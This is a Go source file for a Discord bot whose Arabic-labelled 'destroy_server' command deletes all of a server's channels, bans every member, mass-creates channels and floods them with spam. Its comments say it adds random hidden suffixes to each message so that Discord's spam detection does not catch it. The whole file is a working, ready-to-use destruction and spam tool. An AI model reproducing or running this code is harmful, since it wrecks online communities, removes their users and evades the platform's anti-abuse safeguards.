package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"os/signal"
	"sync"
	"syscall"
	"time"

	"github.com/bwmarrin/discordgo"
)

var client = &http.Client{
	Timeout: 10 * time.Second,
}

func main() {
	token := os.Getenv("MASTERGUARD_TOKEN")
	if token == "" {
		fmt.Println("❌ خطأ: لم يتم العثور على التوكن في متغير البيئة MASTERGUARD_TOKEN")
		return
	}

	sess, err := discordgo.New("Bot " + token)
	if err != nil {
		fmt.Println("خطأ في إنشاء جلسة البوت:", err)
		return
	}

	sess.Identify.Intents = discordgo.IntentsGuilds | discordgo.IntentsGuildMembers

	cmdName := "destroy_server"
	command := &discordgo.ApplicationCommand{
		Name:        cmdName,
		Description: "أمر تدمير السيرفر (بسرعة صاروخية وتخطي حظر تكرار الرسائل)",
		Options: []*discordgo.ApplicationCommandOption{
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "room_name",
				Description: "اسم الرومات الجديدة",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionInteger,
				Name:        "rooms_count",
				Description: "عدد الرومات المراد إنشاؤها",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "message_content",
				Description: "محتوى رسالة السبام",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionInteger,
				Name:        "messages_count",
				Description: "عدد الرسائل في كل روم",
				Required:    true,
			},
		},
	}

	sess.AddHandler(func(s *discordgo.Session, i *discordgo.InteractionCreate) {
		if i.ApplicationCommandData().Name == cmdName {
			if (i.Member.Permissions & discordgo.PermissionAdministrator) == 0 {
				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
					Type: discordgo.InteractionResponseChannelMessageWithSource,
					Data: &discordgo.InteractionResponseData{
						Content: "❌ يجب أن تكون مشرفاً لاستخدام هذا الأمر.",
						Flags:   discordgo.MessageFlagsEphemeral,
					},
				})
				return
			}

			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "🚀 جاري تدمير السيرفر وإرسال السبام بترميز فريد لتجاوز الحظر...",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})

			options := i.ApplicationCommandData().Options
			optionMap := make(map[string]*discordgo.ApplicationCommandInteractionDataOption)
			for _, opt := range options {
				optionMap[opt.Name] = opt
			}

			roomName := optionMap["room_name"].StringValue()
			roomsCount := int(optionMap["rooms_count"].IntValue())
			messageContent := optionMap["message_content"].StringValue()
			messagesCount := int(optionMap["messages_count"].IntValue())

			guildID := i.GuildID

			go executeDestruction(token, guildID, roomName, roomsCount, messageContent, messagesCount)
		}
	})

	err = sess.Open()
	if err != nil {
		fmt.Println("خطأ في فتح الاتصال:", err)
		return
	}

	_, err = sess.ApplicationCommandCreate(sess.State.User.ID, "", command)
	if err != nil {
		fmt.Println("خطأ في تسجيل أمر السلاش:", err)
	}

	fmt.Println("🤖 البوت شغال الآن وجاهز لأوامر السلاش!")

	stop := make(chan os.Signal, 1)
	signal.Notify(stop, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
	<-stop

	sess.Close()
}

func executeDestruction(token, guildID, roomName string, roomsCount int, messageContent string, messagesCount int) {
	headers := map[string]string{
		"Authorization": "Bot " + token,
		"Content-Type":  "application/json",
	}

	// 1. حذف الرومات القديمة بالتوازي السريع جداً
	go func() {
		req, _ := http.NewRequest("GET", "https://discord.com/api/v10/guilds/"+guildID+"/channels", nil)
		for k, v := range headers {
			req.Header.Set(k, v)
		}
		resp, err := client.Do(req)
		if err != nil {
			return
		}
		defer resp.Body.Close()

		var channels []map[string]interface{}
		json.NewDecoder(resp.Body).Decode(&channels)

		for _, ch := range channels {
			if id, ok := ch["id"].(string); ok {
				go func(chID string) {
					delReq, _ := http.NewRequest("DELETE", "https://discord.com/api/v10/channels/"+chID, nil)
					for k, v := range headers {
						delReq.Header.Set(k, v)
					}
					if r, e := client.Do(delReq); e == nil {
						r.Body.Close()
					}
				}(id)
			}
		}
	}()

	// 2. جلب وباند جميع الأعضاء بالكامل
	go func() {
		var userIDs []string
		lastID := "0"

		for {
			url := fmt.Sprintf("https://discord.com/api/v10/guilds/%s/members?limit=1000&after=%s", guildID, lastID)
			req, _ := http.NewRequest("GET", url, nil)
			for k, v := range headers {
				req.Header.Set(k, v)
			}
			resp, err := client.Do(req)
			if err != nil {
				break
			}

			var members []map[string]interface{}
			json.NewDecoder(resp.Body).Decode(&members)
			resp.Body.Close()

			if len(members) == 0 {
				break
			}

			for _, m := range members {
				if user, ok := m["user"].(map[string]interface{}); ok {
					if userID, ok := user["id"].(string); ok {
						userIDs = append(userIDs, userID)
						lastID = userID
					}
				}
			}

			if len(members) < 1000 {
				break
			}
		}

		batchSize := 50
		for i := 0; i < len(userIDs); i += batchSize {
			end := i + batchSize
			if end > len(userIDs) {
				end = len(userIDs)
			}

			for _, uID := range userIDs[i:end] {
				go func(id string) {
					banReq, _ := http.NewRequest("PUT", "https://discord.com/api/v10/guilds/"+guildID+"/bans/"+id, nil)
					for k, v := range headers {
						banReq.Header.Set(k, v)
					}
					if r, e := client.Do(banReq); e == nil {
						r.Body.Close()
					}
				}(uID)
			}
			time.Sleep(50 * time.Millisecond)
		}
	}()

	// 3. إنشاء الرومات بسرعة فائقة (10 رومات في الدفعة وبفاصل 40ms)
	var channelIDs []string
	var mu sync.Mutex
	var wg sync.WaitGroup

	groupSize := 10
	for i := 0; i < roomsCount; i += groupSize {
		end := i + groupSize
		if end > roomsCount {
			end = roomsCount
		}

		for j := i; j < end; j++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				payload, _ := json.Marshal(map[string]interface{}{
					"name": roomName,
					"type": 0,
				})
				req, _ := http.NewRequest("POST", "https://discord.com/api/v10/guilds/"+guildID+"/channels", bytes.NewBuffer(payload))
				for k, v := range headers {
					req.Header.Set(k, v)
				}

				resp, err := client.Do(req)
				if err != nil {
					return
				}
				defer resp.Body.Close()

				if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusCreated {
					var chResult map[string]interface{}
					json.NewDecoder(resp.Body).Decode(&chResult)
					if chID, ok := chResult["id"].(string); ok {
						mu.Lock()
						channelIDs = append(channelIDs, chID)
						mu.Unlock()
					}
				}
			}()
		}
		wg.Wait()
		time.Sleep(40 * time.Millisecond)
	}

	// 4. إرسال الرسائل مع الرمز العشوائي الفريد لكل رسالة لتخطي الحظر بالكامل
	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
	for i := 0; i < len(channelIDs); i += groupSize {
		end := i + groupSize
		if end > len(channelIDs) {
			end = len(channelIDs)
		}

		for _, chID := range channelIDs[i:end] {
			go func(cID string) {
				for m := 0; m < messagesCount; m++ {
					// إضافة رمز عشوائي فريد لكل رسالة لتجنب الحظر الصامت من ديسكورد
					uniqueSuffix := fmt.Sprintf(" ||`[%d-%d]`||", rng.Intn(999999), m)
					finalMsg := messageContent + uniqueSuffix

					msgPayload, _ := json.Marshal(map[string]string{"content": finalMsg})
					msgReq, _ := http.NewRequest("POST", "https://discord.com/api/v10/channels/"+cID+"/messages", bytes.NewBuffer(msgPayload))
					for k, v := range headers {
						msgReq.Header.Set(k, v)
					}

					msgResp, err := client.Do(msgReq)
					if err == nil {
						msgResp.Body.Close()
					}
					time.Sleep(10 * time.Millisecond)
				}
			}(chID)
		}
		time.Sleep(40 * time.Millisecond)
	}
}
